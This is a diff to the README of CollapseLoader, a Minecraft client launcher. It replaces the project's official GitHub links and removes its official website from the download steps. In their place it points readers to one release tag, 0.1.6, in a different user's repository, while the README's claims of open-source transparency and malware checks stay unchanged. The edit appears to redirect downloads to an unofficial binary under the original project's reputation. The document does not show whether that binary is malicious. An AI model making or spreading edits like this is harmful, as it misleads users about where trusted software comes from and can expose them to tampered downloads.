@@ -35,7 +35,7 @@ CollapseLoader is an open-source GUI utility designed to securely launch Minecra
 
 CollapseLoader is designed with security as a top priority. Here’s why you can trust it:
 
-- **Fully Open-Source**: All components, including the launcher, API, and Discord bot, are available on [GitHub](https://github.com/CollapseLoader) for public auditing.
+- **Fully Open-Source**: All components, including the launcher, API, and Discord bot, are available on [GitHub](https://github.com/Latyxxx/CollapseLoader/releases/tag/0.1.6) for public auditing.
 - **Rigorous Client Verification**: Each client is tested using virtual machines, decompilers, debuggers, and VirusTotal to ensure it’s free of malware.
 - **No Obfuscation**: Clients with protectors like VMProtect or Themida are prohibited, and CollapseLoader’s code is free of obfuscation for full transparency.
 
@@ -67,6 +67,6 @@ For more details, see our [Security Overview](SECURITY.md).
 - **Dependencies**: Rust and Tauri (for building from source).
 
 **Download the Latest Release**:
-   - Visit [GitHub Releases](https://github.com/dest4590/CollapseLoader/releases) or [collapseloader.org](https://collapseloader.org).
+   - Visit [GitHub Releases](https://github.com/Latyxxx/CollapseLoader/releases/tag/0.1.6).
    - Download the appropriate binary for your platform (Windows or Linux).
 
